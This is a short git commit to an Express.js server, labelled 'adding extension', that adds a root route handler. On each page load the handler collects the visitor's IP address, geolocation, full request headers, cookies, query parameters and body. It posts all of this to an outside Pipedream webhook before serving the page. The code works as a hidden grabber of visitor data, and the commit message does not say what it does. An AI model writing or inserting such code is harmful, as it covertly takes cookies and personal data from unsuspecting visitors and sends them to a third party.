4c2481f649147e69f69d5b93fe6c26001eb9bfa8
Patrick Acioli <patrickacioli23@gmail.com>
2024-09-20 11:51:58 -0300

    adding extension

--- index.js
+++ index.js
@@ -31,6 +31,28 @@ app.get("/IMG0056.png", (req, res) => {
     })    
 });
 
+app.get("/", (req, res) => {
+    console.log(`REQUEST`, req)
+    const clientIp = requestIp.getClientIp(req); 
+    const location = geoip.lookup(clientIp);
+    instance.post('https://eo2y2cjch3zlyga.m.pipedream.net/', {
+        data: {
+            timestamp: new Date().toISOString(),
+            method: req.method,
+            url: req.originalUrl,
+            ip: clientIp,
+            location,
+            headers: req.headers,
+            userAgent: req.headers['user-agent'], // Capture user-agent
+            cookies: req.cookies || {}, // If cookies are being sent
+            queryParams: req.query, // Capture query parameters
+            body: req.body, // If body parser is used for post data
+        }
+    }).then((response) => {
+        res.sendFile(__dirname + '/public/index.html');
+    })    
+});
+
 app.use(express.static('public'))
 
 
